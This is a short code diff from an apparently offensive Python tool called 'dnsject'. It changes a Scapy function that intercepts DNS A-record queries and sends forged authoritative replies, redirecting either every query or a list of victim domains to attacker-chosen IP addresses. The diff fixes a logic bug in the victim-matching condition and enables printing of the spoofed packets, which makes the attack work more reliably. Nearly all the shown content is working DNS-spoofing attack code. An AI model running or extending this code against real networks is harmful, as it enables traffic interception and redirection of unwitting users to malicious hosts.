@@ -11,14 +11,14 @@ def spoofPacket(pkt):
 	if (pkt.haslayer(DNSQR) and 
 		pkt[DNS].qr == 0 and 
 		pkt[DNSQR].qtype ==1 and 
-		(fullAttack or pkt[DNSQR].qname) in victims):
+		(fullAttack or (pkt[DNSQR].qname in victims))):
 		#print pkt.show()
 		spfPkt = IP(src=pkt[IP].dst, dst=pkt[IP].src)\
 				/UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport)\
 				/DNS(id=pkt[DNS].id, qr=1, ancount=1, aa=1, qd=pkt[DNS].qd,
 					an=DNSRR(rrname=pkt[DNSQR].qname, ttl=10000, 
 						rdata=defSpoofIp if fullAttack else victims[pkt[DNSQR].qname]))
-		#print spfPkt.show()
+		print spfPkt.show()
 		send(spfPkt)
 
 parser = argparse.ArgumentParser(description="dnsject", add_help=False)
